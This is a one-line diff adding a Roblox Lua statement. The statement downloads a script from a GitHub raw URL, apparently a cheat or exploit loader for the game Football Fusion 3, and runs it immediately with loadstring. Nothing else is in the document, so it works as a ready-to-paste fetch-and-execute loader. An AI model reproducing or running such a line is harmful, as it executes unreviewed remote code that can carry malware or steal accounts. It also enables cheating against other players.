@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Bravedersolve/loaders/main/loaders/football-fusion-3-spam4-ewh7t93bfilfhh.lua"))()
